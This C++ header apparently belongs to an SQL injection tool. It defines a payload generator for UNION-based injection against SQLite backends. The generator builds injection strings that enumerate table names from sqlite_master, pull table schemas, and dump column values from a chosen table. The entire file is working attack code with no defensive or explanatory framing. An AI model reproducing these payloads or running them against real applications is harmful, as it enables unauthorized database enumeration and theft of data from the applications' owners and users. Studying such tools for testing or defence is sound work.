#ifndef SQLITE_UNION_BASED
#define SQLITE_UNION_BASED

#define OFFSET 0
#define TABLE 2
#define COLUMN 3
#define OFFSET_LEN 6

#include "../../Vaccine.hpp"

struct sqlite_union_based
{
        static std::string payload(sptr_vector& params, uint8 type)
        {
                std::string offset;
                switch (type)
                {
                case TABLES:
                        offset = *params[OFFSET];
                        *params[OFFSET] += "null, ";
                        return "' UNION SELECT " + offset + "name " +
                               "FROM sqlite_master-- ";
                case COLUMNS:
                        if (params[OFFSET + 1] != NULL)
                        {
                                for (uint8 i = 0; i < OFFSET_LEN; ++i)
                                        params[OFFSET]->pop_back();
                                params[OFFSET + 1] = NULL;
                        }
                        return "' UNION SELECT " +
                               *params[OFFSET] + "sql " +
                               "FROM sqlite_master " +
                               "WHERE type='table' " +
                               "AND name='" +
                               *params[TABLE + 1] + "'-- ";
                case VALUES:
                        return "' UNION SELECT " + *params[OFFSET] +
                               *params[COLUMN] + " " +
                               "FROM " + *params[TABLE] + "-- ";
                default:
                        return std::string();
                }
        };
};
#endif